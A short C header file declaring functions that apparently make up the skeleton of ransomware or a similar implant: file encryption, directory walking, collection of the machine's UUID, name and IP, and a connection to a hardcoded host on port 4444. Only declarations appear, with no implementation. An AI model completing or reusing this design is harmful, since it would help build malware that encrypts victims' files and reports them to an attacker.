#ifndef FUNCS_H_INCLUDED
#define FUNCS_H_INCLUDED

#define myhost "192.168.0.103"
#define myport 4444

void connectserver(char *uuid, char *hostname);

void encryptfile(char *encryptfile);

void WhatIsDir(char *name_dir);

char *getuuid();

char *getpcname();

char *getip();

#endif
